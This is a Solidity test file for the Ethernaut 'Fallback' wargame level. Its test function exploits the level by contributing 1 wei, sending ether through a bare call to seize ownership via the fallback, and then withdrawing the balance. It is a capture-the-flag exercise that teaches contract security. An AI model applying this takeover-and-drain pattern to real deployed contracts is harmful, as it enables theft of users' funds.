// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {EthernautTest} from "./utils/EthernautTest.sol";
import {FallbackFactory} from "../src/factories/FallbackFactory.sol";
import {Fallback} from "../src/levels/Fallback.sol";
import "forge-std/console.sol";

contract FallbackTest is EthernautTest {
    function setUp() public override {
        super.setUp();
        FallbackFactory factory = new FallbackFactory();
        ethernaut.registerLevel(factory);
        levelAddress = ethernaut.createLevelInstance(factory);
    }

    function testSolveFallback() public {
        Fallback instance = Fallback(payable(levelAddress));

        // insert your code here!

        console.log("Before owner", instance.owner());
        // console.log("Before msg.sender", msg.sender);

        instance.contribute{value: 1 wei}();
        (bool success, ) = levelAddress.call{value: 1 wei}("");
        require(success);

        console.log("After owner", instance.owner());
        // console.log("Before msg.sender", msg.sender);

        instance.withdraw();

        assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }

    receive() external payable {}
}
